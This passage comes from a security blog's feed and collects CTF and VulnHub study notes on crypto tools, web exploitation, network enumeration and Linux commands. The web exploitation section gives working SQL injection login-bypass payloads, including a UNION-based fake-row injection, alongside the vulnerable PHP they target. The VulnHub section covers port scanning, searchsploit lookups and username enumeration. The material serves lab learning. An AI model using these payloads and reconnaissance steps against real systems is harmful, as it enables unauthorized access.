<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo hello &gt; -</span></code></pre></td></tr></table></div></figure>
and this file can be opened by
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat ./-</span></code></pre></td></tr></table></div></figure>
This is needed because lot of programs use &#8220;-&#8221; to mean stdin/stdout.
</li>

<li>If you have a hex dump of something and you want to create the binary version of the data?
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xxd -r &lt;data&gt;
</span><span class='line'>&lt;data&gt; is the hexdump of the binary file.</span></code></pre></td></tr></table></div></figure> </li>


</ol>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Learning From CTF : Cryptography]]></title>
    <link href="http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-cryptography/"/>
    <updated>2014-11-07T19:25:31+00:00</updated>
    <id>http://bitvijays.github.io/blog/2014/11/07/learning-from-ctf-cryptography</id>
    <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Cryptography challenges during various CTF&rsquo;s.</p>

<!-- more -->


<ol>
<li>Caesar cipher and substitution cipher can be solved by using <a href="https://www.cryptool.org/en/cryptool1-en">Cryptool 1</a>. Just check the Analysis option, there&rsquo;s analysis for Symmetric Key, Asymmetric Key, Hash and others. Otherwise, a good website to solve substitution cipher is <a href="http://quipqiup.com/">Quipqiup</a>.
<br></li>
<li>If you get some text atleast few paragraphs and some random numbers as (1, 9, 4) (4, 2, 8) (4, 8, 3) (7, 1, 5) (8, 10, 1), it might mean (Paragraph, Line, Word).
<br></li>
<li>If you get some ciphertext encrypted by XOR, <a href="https://github.com/hellman/xortool">xortool</a> might be helpful. It can help you to find the key length and the key.</li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Learning From CTF : Web Exploitation]]></title>
    <link href="http://bitvijays.github.io/blog/2014/11/06/learning-from-ctf-web-exploitation/"/>
    <updated>2014-11-06T19:02:50+00:00</updated>
    <id>http://bitvijays.github.io/blog/2014/11/06/learning-from-ctf-web-exploitation</id>
    <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Web Exploitation challenges during various CTF&rsquo;s.</p>

<!-- more -->


<ol>
<li> You may want to use your browser to view the source of the web page. Sometimes, important information is hidden using comments.</li>
<br>
<li> It may be helpful to learn how to &#8216;Inspect Elements&#8217; in your browser. It helps you to distinguish each element which might be or not be hidden. </li>
<br>
<li> Some symbols need to be URL Encoded when included in GET requests.
<br>
<table cellpadding="6px" border="1" style="border:1px solid #C0C0C0; border-collapse:collapse; background-color:white;">
<caption>Reserved characters after percent-encoding</caption>
<tr>
<td><code>!</code></td>
<td><code>#</code></td>
<td><code>$</code></td>
<td><code>&amp;</code></td>
<td><code>'</code></td>
<td><code>(</code></td>
<td><code>)</code></td>
<td><code>*</code></td>
<td><code>+</code></td>
<td><code>,</code></td>
<td><code>/</code></td>
<td><code>:</code></td>
<td><code>;</code></td>
<td><code>=</code></td>
<td><code>?</code></td>
<td><code>@</code></td>
<td><code>[</code></td>
<td><code>]</code></td>
</tr>
<tr>
<td><code>%21</code></td>
<td><code>%23</code></td>
<td><code>%24</code></td>
<td><code>%26</code></td>
<td><code>%27</code></td>
<td><code>%28</code></td>
<td><code>%29</code></td>
<td><code>%2A</code></td>
<td><code>%2B</code></td>
<td><code>%2C</code></td>
<td><code>%2F</code></td>
<td><code>%3A</code></td>
<td><code>%3B</code></td>
<td><code>%3D</code></td>
<td><code>%3F</code></td>
<td><code>%40</code></td>
<td><code>%5B</code></td>
<td><code>%5D</code></td>
</tr>
</table>
<br>
<table cellpadding="6px" border="1" style="border:1px solid #C0C0C0; border-collapse:collapse; background-color:white;">
<caption>Common characters after percent-encoding (ASCII or UTF-8 based)</caption>
<tr>
<td>newline</td>
<td>space</td>
<td><code>"</code></td>
<td><code>%</code></td>
<td><code>-</code></td>
<td><code>.</code></td>
<td><code>&lt;</code></td>
<td><code>&gt;</code></td>
<td><code>\</code></td>
<td><code>^</code></td>
<td><code>_</code></td>
<td><code>`</code></td>
<td><code>{</code></td>
<td><code>|</code></td>
<td><code>}</code></td>
<td><code>~</code></td>
</tr>
<tr>
<td><code>%0A</code> <i>or</i> <code>%0D</code> <i>or</i> <code>%0D%0A</code></td>
<td><code>%20</code></td>
<td><code>%22</code></td>
<td><code>%25</code></td>
<td><code>%2D</code></td>
<td><code>%2E</code></td>
<td><code>%3C</code></td>
<td><code>%3E</code></td>
<td><code>%5C</code></td>
<td><code>%5E</code></td>
<td><code>%5F</code></td>
<td><code>%60</code></td>
<td><code>%7B</code></td>
<td><code>%7C</code></td>
<td><code>%7D</code></td>
<td><code>%7E</code></td>
</tr>
</table>
</li>
<br>
<li> In some web exploitation challenges, if the secret is stored on the client side and there are some javascript involved, you could possibly find the answer in the Javascript console, Browser Developer Tools.  (F12 Key).</li>
<br>
<li>Websites keep track of you (Whether you are login-ed or not) by keeping a cookie for you, check that if the value (if easy and most probably assigned linearly) of cookie can be changed to any user who might already be logined.</li>
<br>
<li>If the Login prompt contains SQL query and check contains only one result if (mysqli_num_rows($result) !== 1), then use limit 1 such as admin&#8217; or 1=1 limit 1;#
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$username = $_POST["username"];
</span><span class='line'>$password = $_POST["password"];
</span><span class='line'>$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
</span><span class='line'>$result = mysqli_query($con, $query);
</span><span class='line'>
</span><span class='line'>if (mysqli_num_rows($result) !== 1) {
</span><span class='line'>  echo "&lt;h1&gt;Login failed.&lt;/h1&gt;";
</span><span class='line'>} else {
</span><span class='line'>  echo "&lt;h1&gt;Logged in!&lt;/h1&gt;";
</span><span class='line'>  echo "&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;";
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
</li>
<li>If the Login prompt contains SQL query and checks only one result, plus have extra checks (see example below), then we can create a fake row SQL whose value we control.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$con = mysqli_connect("localhost", "sql2", "sql2", "sql2");
</span><span class='line'>$username = $_POST["username"];
</span><span class='line'>$password = $_POST["password"];
</span><span class='line'>$query = "SELECT * FROM users WHERE username='$username'";
</span><span class='line'>$result = mysqli_query($con, $query);
</span><span class='line'>
</span><span class='line'>$logged_in = false;
</span><span class='line'>if (mysqli_num_rows($result) === 1) {
</span><span class='line'>  $row = mysqli_fetch_array($result);
</span><span class='line'>  if ($row["password"] === $password) {
</span><span class='line'>    $logged_in = true;
</span><span class='line'>    echo "&lt;h1&gt;Logged in!&lt;/h1&gt;";
</span><span class='line'>    echo "&lt;pre&gt;User level: ", $row["user_level"],  "&lt;/pre&gt;";
</span><span class='line'>    if ($row["user_level"] &gt;= 1337) {
</span><span class='line'>      echo "&lt;p&gt;Your flag is: $FLAG&lt;/p&gt;";
</span><span class='line'>    } else {
</span><span class='line'>      echo "&lt;p&gt;Only user levels 1337 or above can see the flag.&lt;/p&gt;";
</span><span class='line'>    }
</span><span class='line'>  }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
You have to create a fake query such as
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>random'AND 1=0 UNION ALL SELECT 'admin' AS username, 'hax' AS password, 2000 AS user_level --
</span><span class='line'>where  
</span><span class='line'>The ' closes the username string and 1=0 will always return false, invalidating the first half.
</span><span class='line'>The union all statement allows us to concatenate two SQL select queries, so we append UNION ALL and then our fake select statement.</span></code></pre></td></tr></table></div></figure>
Don&#8217;t forget to enter the same password in the password field :P
</li>
<br>
<li>Perl Script running on a webpage, read <a href="http://www.cgisecurity.com/lib/sips.html">Security Issues in Perl Scripts</a></li>
<br>
<li>In some web exploitation excercises, you can modify the GET/POST request in the burpsuite to get the flag.</li>
<br>
</ol>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Learning From VulnHub]]></title>
    <link href="http://bitvijays.github.io/blog/2014/11/03/learning-from-vulnhub/"/>
    <updated>2014-11-03T16:40:21+00:00</updated>
    <id>http://bitvijays.github.io/blog/2014/11/03/learning-from-vulnhub</id>
    <content type="html"><![CDATA[<p>This post (Work in Progress) mark downs the learning gathered by doing the vulnerable machines provided by the VulnHub. Once you download the virtual machine from the website and run it in VMware or Virtual Box, below steps could be followed to find the vulnerabilties.</p>

<!-- more -->


<ol>

<li>Finding the IP address:

<ul>
<li>Netdiscover:  an active/passive arp reconnaissance tool
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>netdiscover [options] 
</span><span class='line'>-i interface : The network interface to sniff and inject packets.
</span><span class='line'>-r range     : Scan a given range instead of auto scan.
</span><span class='line'>
</span><span class='line'>Example: netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24</span></code></pre></td></tr></table></div></figure>
<figure class='code'><figcaption><span>Interface name for Virtualization Software</span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Virtualbox   : vboxnet
</span><span class='line'>Vmware       : vmnet</span></code></pre></td></tr></table></div></figure>
</li>

<li>Nmap: Network exploration tool and security / port scanner
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap [Scan Type] [Options] {target specification}
</span><span class='line'>-sP/-sn Ping Scan - disable port scan 
</span><span class='line'>Example: nmap -sP/-sn 192.168.1.0/24</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>



<li>Port Scanning the system:
<br>
Port scanning provides a large amount of information on open services and possible exploits that target these services.
Two options
<ul>
<li>Unicornscan:  port scanner that utilizes it’s own userland TCP/IP stack, which allows it to run a asynchronous scans. Faster than nmap and can scan 65,535 ports in a relatively shorter time frame.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unicornscan [options] X.X.X.X/YY:S-E
</span><span class='line'>-i, --interface      : interface name, like eth0 or fxp1, not normally required
</span><span class='line'>-m, --mode           : scan mode, tcp (syn) scan is default, U for udp T for tcp `sf' for tcp connect scan and A for arp
</span><span class='line'>                 for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn|FIN|NO Push|URG)
</span><span class='line'>
</span><span class='line'>Address ranges are cidr like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask then /32 is implied.
</span><span class='line'>Port ranges are like 1-4096 with 53 only scanning one port, a for all 65k and p for 1-1024
</span><span class='line'>
</span><span class='line'>example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for gateway.</span></code></pre></td></tr></table></div></figure>
</li>

<li>Nmap: Network exploration tool and security / port scanner
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap [Scan Type] [Options] {target specification}
</span><span class='line'>HOST DISCOVERY:
</span><span class='line'>-sL: List Scan - simply list targets to scan
</span><span class='line'>-sn: Ping Scan - disable port scan
</span><span class='line'>-Pn: Treat all hosts as online -- skip host discovery
</span><span class='line'>
</span><span class='line'>SCAN TECHNIQUES:
</span><span class='line'>-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
</span><span class='line'>-sU: UDP Scan
</span><span class='line'>-sN/sF/sX: TCP Null, FIN, and Xmas scans
</span><span class='line'>
</span><span class='line'>PORT SPECIFICATION:
</span><span class='line'>-p &lt;port ranges>: Only scan specified ports
</span><span class='line'>Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
</span><span class='line'>
</span><span class='line'>SERVICE/VERSION DETECTION:
</span><span class='line'>-sV: Probe open ports to determine service/version info
</span><span class='line'>
</span><span class='line'>OUTPUT:
</span><span class='line'>-oN/-oX/-oS/-oG &lt;file>: Output scan in normal, XML, s|&lt;rIpt kIddi3, and Grepable format, respectively, to the given filename.
</span><span class='line'>-oA &lt;basename>: Output in the three major formats at once
</span><span class='line'>-v: Increase verbosity level (use -vv or more for greater effect)
</span><span class='line'>
</span><span class='line'>MISC:
</span><span class='line'>-6: Enable IPv6 scanning
</span><span class='line'>-A: Enable OS detection, version detection, script scanning, and tracerout</span></code></pre></td></tr></table></div></figure>
</li>
</ul>

As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. <a href="https://twitter.com/superkojiman">superkojiman</a> has written a script for this available at <a href="https://github.com/superkojiman/onetwopunch">GitHub</a>.
</li>
<br>

<li>Probing it further: 
<br>
At this point, you would have an idea about the different services and service version running on the system.

<ol>
<li>searchsploit: Exploit Database Archive Search.
<br>
First, we need to check if the operating system is using any services which are vulnerable or the exploit is already available in the internet.
For example, A vulnerable service webmin is present in <a href="http://vulnhub.com/entry/pwnos-10,33/">pWnOS 1.0</a> which can be exploited to extract information from the system.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -sV -A 172.16.73.128
</span><span class='line'>**********Trimmed**************
</span><span class='line'>10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
</span><span class='line'>|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
</span><span class='line'>| ndmp-version: 
</span><span class='line'>|_  ERROR: Failed to get host information from server
</span><span class='line'>**********Trimmed**************</span></code></pre></td></tr></table></div></figure>

If you search for webmin in searchsploit, you would find different exploits available for it and you would just have to use the correct one based on the utility and the version matching.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# searchsploit webmin
</span><span class='line'>**********Trimmed**************
</span><span class='line'> Description                                                                            Path
</span><span class='line'>----------------------------------------------------------------------------------------------------------------
</span><span class='line'>Webmin &lt; 1.290 / Usermin &lt; 1.220 Arbitrary File Disclosure Exploit                   | /multiple/remote/1997.php
</span><span class='line'>Webmin &lt; 1.290 / Usermin &lt; 1.220 Arbitrary File Disclosure Exploit (perl)            | /multiple/remote/2017.pl
</span><span class='line'>Webmin 1.x HTML Email Command Execution Vulnerability                                | /cgi/webapps/24574.txt
</span><span class='line'>**********Trimmed**************</span></code></pre></td></tr></table></div></figure>
</li>
<li>Webserver Opportunities?:
<br>
<ul>
<li>Names? Possible Usernames? Possible Passwords?:
<br>
Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/https webserver), you would found possible names of the employees working in the company. Now, it is common practise to have username based on your first/last name. It can be based on different combinations such as firstname.lastname or first letter of first name + lastname etc. <a href="https://twitter.com/superkojiman">superkojiman</a> has written a python script named &#8220;namemash.py&#8221; available at <a href="https://gist.githubusercontent.com/superkojiman/11076951/raw/namemash.py">here</a> which could be used to create possible usernames.
<br><br>
However, we still have a large amount of usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.
<ol>
<li>Using metasploit smtp_enum module:
<br>
Once msfconsole is running, use auxiliary/scanner/smtp/smtp_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.
</li>
<li>Using VRFY command:</li>
<li>Using RCPT TO command:</li>
</ol>

</li>
</ul>
</li>
<br>
<li>FTP Opportunities:
<br>
If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -rq ftp://&lt;IP address> 
</span><span class='line'>--ftp-user=username
</span><span class='line'>--ftp-password=password</span></code></pre></td></tr></table></div></figure>
</li>

</ol>
</li>

<li>Tips:
<ul>
<li>Wheel group typically has special(higer) privileges such as ability to become root, or the ability to bypass certain security restrictions.</li>
</ul>
</li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Linux Essentials]]></title>
    <link href="http://bitvijays.github.io/blog/2014/10/07/linux-essentials/"/>
    <updated>2014-10-07T23:07:48+01:00</updated>
    <id>http://bitvijays.github.io/blog/2014/10/07/linux-essentials</id>
    <content type="html"><![CDATA[<p>This post lists essential commands and concepts which would be helpful to a Linux user. We would cover tools required for programming, system administration. Also, provide some useful tips, tricks and TODO which would help you learn and practice.</p>

<!-- more -->


<p></p>

<ol>
<li>Vi : Powerful Editor:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vi &lt;filename>           - Open a file to edit in Vi editor.
</span><span class='line'>Two modes               - Command and Insert Mode. All commands below are in command mode.
</span><span class='line'>:q                      - Quit.
</span><span class='line'>:wq                     - Save and close.
</span><span class='line'>:syntax on              - Turn on Syntax highlighting for C programming and other languages.
</span><span class='line'>:set number             - Turn on the line numbers.
</span><span class='line'>:set nonumber           - Turn off the line numbers.
</span><span class='line'>:u                      - Undo one change.
</span><span class='line'>dd                      - Delete current line. 
</span><span class='line'>d$                      - Delete the text from where your cursor is to the end of the line.
</span><span class='line'>dnd                     - Delete n lines.
</span><span class='line'>yy                      - Yank or copy current line.
</span><span class='line'>y$, yny                 - Similar to delete lines.
</span><span class='line'>p                       - Paste the line in the buffer in to text after the current line.</span></code></pre></td></tr></table></div></figure>
Two configurations files which are important:
<ul>
<li>.vimrc&nbsp;&nbsp;&nbsp;&nbsp;   - Contains optional runtime configuration settings to initialize Vim when it starts. Example: If you want Vim to have syntax on and line numbers on, whenever you open vi, enter syntax on and set number in this file.</li>
<li>.viminfo - Viminfo file stores command-line, search string, input-line history and other stuff. Useful if you want to find out what user has been doing in vi.</li>
</ul> 
<br>  
PS: Both files are present in user home directory.   
<br>
<br>
sed - stream editor in Vi is really very useful. It is also a standalone application.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>:s/test/learn     - would replace test to learn in current line but only first instance.
</span><span class='line'>:s/test/learn/g   - would replace test to learn in current line all the instance.
</span><span class='line'>:s/test/learn/gi  - would replace test (all cases) to learn in current line all the instance.
</span><span class='line'>:%s/test/learn/gi - would replace test to learn in the file (all lines)</span></code></pre></td></tr></table></div></figure>
</li>
<li>Bash configuration files - For Debian/Ubuntu based Systems.
<ol type="i">
<li>~/.bash_profile - Stores user environment variables.</li>
<li>~/.bash_history - contains all the history of the commands.</li>
<li>~/.bash_logout&nbsp;  - contains the command which are executed when bash is exited.</li>
<li>~/.bashrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;       - setting of variables for bash.</li>
<li>/etc/profile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - Global system configuration for bash which controls the environmental variables and programs that are to be run when bash is executed. Setting of PATH variable and PS1.</li>
<li>/etc/bashrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;     - Global system configuration for bash which controls the aliases and functions to be run when bash is executed.</li>
</ol>
<br>
Few Important Variables
<ol type="i">
<li>HISTSIZE&nbsp;&nbsp;&nbsp;&nbsp; - Controls the number of commands to remember in the history command. The default value is 500.</li>
<li>HISTFILE&nbsp;&nbsp;&nbsp;&nbsp; - Defines the file in which all commands will be logged to. Normally the value for this variable is set to ~/.bash_history. This means that whatever you type in bash will be stored into the value of HISTFILE. It is advisable to leave it undefined, or pipe the output to /dev/null (For privacy reasons).</li>
<li>HISTFILESIZE - Defines the maximum number of commands in ~/.bash_history.</li>
</ol>
</li>
<br>
<li>System Administration
<ul>
<li>Updating Debian Linux System
<ul>
<li>Using apt-get
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apt-get update                 - Sync with Repositories.
</span><span class='line'>apt-get upgrade                - Upgrade installed packages.
</span><span class='line'>apt-get dist-upgrade           - Upgrade distribution packages.
</span><span class='line'>apt-get install "Package Name" - Install the package.
</span><span class='line'>apt-get remove  "Package Name" - Uninstall the package.
</span><span class='line'>apt-get purge   "Package Name" - Removes the package as well as the configurations files.
</span><span class='line'>apt-cache show  "Package name" - Shows what package is used for.
</span><span class='line'>apt-cache search "Keywords"    - Search package name based on keywords.</span></code></pre></td></tr></table></div></figure>
Tip: As mostly, updating takes time, you can club all the commands like &#8220;apt-get update && apt-get upgrade && apt-get dist-upgrade && poweroff&#8221;. 
<br>
<br>
poweroff would shutdown the system after everything is updated.
<br>
<br>
</li>
<li>Using Debian Package Manager dpkg
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dpkg -i &lt;Package>.deb          - install package.
</span><span class='line'>dpkg -r &lt;Package>              - Removes everything except configuration files.
</span><span class='line'>dpkg -P &lt;Package>              - Removes configurations files too.
</span><span class='line'>dpkg -l                        - Shows the list of all installed packages.
</span><span class='line'>dpkg -L "Package name"         - Shows a list of files installed by specific packages.
</span><span class='line'>dpkg -S "File path"            - Shows the package to which a file belong to.</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>

<li>Adding/Deleting/Modifying Users/Groups
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>adduser &lt;username> : Add a user.
</span><span class='line'>   --gecos GECOS   : adduser won't ask for finger information.
</span><span class='line'>   --system        : Create a system user.
</span><span class='line'>   --quiet         : Suppress informational messages, only show warnings and errors.
</span><span class='line'>   --disabled-login: Do not run passwd to set the password.
</span><span class='line'>deluser &lt;username> : Delete a user.
</span><span class='line'> --remove-home     : Remove the home directory of the user and its mailspool.
</span><span class='line'> --remove-all-files: Remove all files from the system owned by this user. 
</span><span class='line'> --backup          : Backup all files contained in the userhome and the mailspool-file to a file named /$user.tar.bz2 or /$user.tar.gz.
</span><span class='line'>usermod            : Modify a user account.
</span><span class='line'> -e EXPIREDATE     : The date on which the user account will be disabled. The date is specified in the format YYYY-MM-DD.
</span><span class='line'> -L, --lock        : Lock a user's password.
</span><span class='line'> -U, --unlock      : Unlock a user's password.
</span><span class='line'>groupadd           : Create a new group.
</span><span class='line'>groupdel           : Delete a group.
</span><span class='line'>groupmod           : Modify a group definition on the system.</span></code></pre></td></tr></table></div></figure>
</li>
<li>Changing Group/Owner/Permission
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chown              : Change file owner and group.
</span><span class='line'>-reference=RFILE   : use RFILE's owner and group rather than specifying OWNER:GROUP values.
</span><span class='line'>-R, --recursive    : operate on files and directories recursively.
</span><span class='line'>chmod              : change file mode bits.
</span><span class='line'>chgrp              : change group ownership.
</span><span class='line'>SUID bit           : SetUID bit specfies that an executable should run as its owner instead of the user executing it.
</span><span class='line'>                   : SUID is mostly commonly used to run an executable as root, allowing users to perform tasks such as changing their passwords.
</span><span class='line'>         : If there is a flaw in a SUID root executable, you can run arbitrary code as root.</span></code></pre></td></tr></table></div></figure>
</li>

<li>Mounting/Unmounting
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount &lt;device> &lt;dir> : Mount a filesystem.
</span><span class='line'>-r, --read-only      : Mount the filesystem read-only.
</span><span class='line'>unmount {dir|device} : Umount file systems.</span></code></pre></td></tr></table></div></figure>
</li>
</ul>

<li>Linux Directories
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/home                             : users home directories.
</span><span class='line'>/etc                              : system-wide configuration files.
</span><span class='line'>/bin, /usr/bin, /usr/local/bin    : directories with executable files.
</span><span class='line'>/lib, /usr/lib, /usr/local/lib    : shared libraries needed to support the applications.
</span><span class='line'>/sbin, /usr/sbin, /usr/local/sbin : directories with executables supposed to be run by the Superuser.
</span><span class='line'>/tmp, /var/tmp                    : temporary directories, watch out as /tmp is, by default, cleaned out on each reboot.
</span><span class='line'>/usr/share/doc, /usr/share/man    : complete system documentation.
</span><span class='line'>/dev                              : system device files. In Unix, hardware devices are represented as files.
</span><span class='line'>/proc                             : "virtual" directory containing files through which you can query or tune Linux kernel settings.</span></code></pre></td></tr></table></div></figure>
</li>

<li>Runlevels and Kernel Configurations

